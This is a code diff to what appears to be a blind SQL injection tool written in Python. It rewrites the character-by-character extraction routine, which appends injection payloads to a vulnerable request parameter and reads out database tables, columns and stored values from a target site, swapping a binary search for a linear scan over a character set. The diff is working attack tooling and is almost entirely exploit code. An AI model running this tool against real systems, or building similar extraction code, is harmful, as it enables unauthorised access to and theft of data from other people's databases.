@@ -2,6 +2,7 @@
 
 import sys
 import time
+import string
 
 from colorama import Fore
 from urlQuery import sendReq
@@ -18,13 +19,13 @@ def boolenTF(url, params, d):
         else:
             return False
      
-def prepPayload(params, vulnPoint, payloads, row, extract, pos, op, x, tblName=None, clmName=None):
+def prepPayload(params, vulnPoint, payloads, row, extract, pos, x, tblName=None, clmName=None):
     if extract == "tbls":
-        injPayload = payloads.format(row=row, pos=pos, op=op, x=x)
+        injPayload = payloads.format(row=row, pos=pos, x=x)
     elif extract == "clms":
-        injPayload = payloads.format(tblName=tblName, row=row, pos=pos, op=op, x=x)
+        injPayload = payloads.format(tblName=tblName, row=row, pos=pos, x=x)
     elif extract == "info":
-        injPayload = payloads.format(clmName=clmName, tblName=tblName, row=row, pos=pos, op=op, x=x)
+        injPayload = payloads.format(clmName=clmName, tblName=tblName, row=row, pos=pos, x=x)
     newParams = params.copy()
     newParams[vulnPoint] += injPayload
     return newParams
@@ -32,50 +33,19 @@ def prepPayload(params, vulnPoint, payloads, row, extract, pos, op, x, tblName=N
 def extractTimeInfo(url, params, vulnPoint, payloads, row, d, extract, tblName=None, clmName=None, max_length=100):
     x = ''
     pos = 1
-    op = ">"
-
     while True:
         found = False
-        low = 32
-        high = 128
-
-        while low <= high:
-            mid = low + (high - low) // 2
-            newParams = prepPayload(params, vulnPoint, payloads, row, extract, pos, op, mid, tblName=tblName, clmName=clmName)
+        for char in string.ascii_lowercase + string.ascii_uppercase + string.digits + "!\"£$%^&*()_+=-][\{\}/.,<>?]":
+            newParams = prepPayload(params, vulnPoint, payloads, row, extract, pos, ord(char), tblName=tblName, clmName=clmName)
             if boolenTF(url, newParams, d):
-                low = mid + 1
-            else:
-                high = mid - 1
-
-        if 32 <= mid <= 126:
-            found = True
-        if found:
-            op = "="
-            newParams = prepPayload(params, vulnPoint, payloads, row, extract, pos, op, mid, tblName=tblName, clmName=clmName)
-            if boolenTF(url, newParams, d):
-                x += chr(mid)
+                x += char
                 sys.stdout.write(Fore.GREEN + f"\r[+] Result: {x}" + Fore.RESET)
+                pos += 1
                 found = True
-            else:
-                newX = mid +1
-                newParams = prepPayload(params, vulnPoint, payloads, row, extract, pos, op, newX, tblName=tblName, clmName=clmName)
-                if boolenTF(url, newParams, d):
-                    x += chr(newX)
-                    sys.stdout.write(Fore.GREEN + f"\r[*] Result: {x}" + Fore.RESET)
-                    found = True
-                else:
-                    found = False
-                    break
-        else:
-            found = False
-            break
+                break
         
-        if not found or len(x) >= max_length or mid > 127:
+        if not found or len(x) >= max_length:
             break
-        pos += 1
-        low = 32
-        high = 128
-        op = ">"
     return x
 
 def extractTables(url, params, vulnPoint, payloads, d):
